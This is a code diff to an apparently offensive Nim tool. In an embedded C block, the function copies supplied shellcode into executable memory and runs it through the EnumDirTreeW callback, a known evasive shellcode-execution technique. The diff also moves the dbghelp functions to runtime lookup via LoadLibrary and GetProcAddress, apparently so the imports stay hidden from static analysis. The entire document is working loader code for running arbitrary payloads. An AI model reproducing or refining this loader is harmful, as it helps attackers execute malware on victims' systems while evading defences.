@@ -4,16 +4,33 @@ import public
 {.emit: """
 #include <windows.h>
 #include <stdio.h>
-#include <Dbghelp.h>
 
+typedef BOOL
+(CALLBACK* PENUMDIRTREE_CALLBACKW)(
+    PCWSTR FilePath,
+    PVOID CallerData);
+
+typedef BOOL (WINAPI* EnumDir)(HANDLE hProcess,
+    PCWSTR RootPath,
+    PCWSTR InputPathName,
+    PWSTR OutputPathBuffer,
+    PENUMDIRTREE_CALLBACKW cb,
+    PVOID data);
+
+typedef BOOL(WINAPI* Sysinit)(
+    HANDLE hProcess,
+    PCSTR UserSearchPath,
+    BOOL fInvadeProcess);
+    
 int EnumDirTreeWNim(char *shellcode,SIZE_T shellcodeSize) {
+    HMODULE dbgaddr = LoadLibrary("dbghelp.dll");
+    EnumDir enumdirfunc = (EnumDir)GetProcAddress(dbgaddr, "EnumDirTreeW");
+    Sysinit sysinitfunc = (Sysinit)GetProcAddress(dbgaddr, "SymInitialize");
     LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     ::RtlMoveMemory(addr, shellcode, shellcodeSize);
-
-    ::SymInitialize(::GetCurrentProcess(), NULL, TRUE);
-
+    sysinitfunc(::GetCurrentProcess(), NULL, TRUE);
     WCHAR dummy[522];
-    ::EnumDirTreeW(::GetCurrentProcess(), L"C:\\Windows", L"*.log", dummy, (PENUMDIRTREE_CALLBACKW)addr, NULL);
+    enumdirfunc(::GetCurrentProcess(), L"C:\\Windows", L"*.log", dummy, (PENUMDIRTREE_CALLBACKW)addr, NULL);
 }
 """
 .}
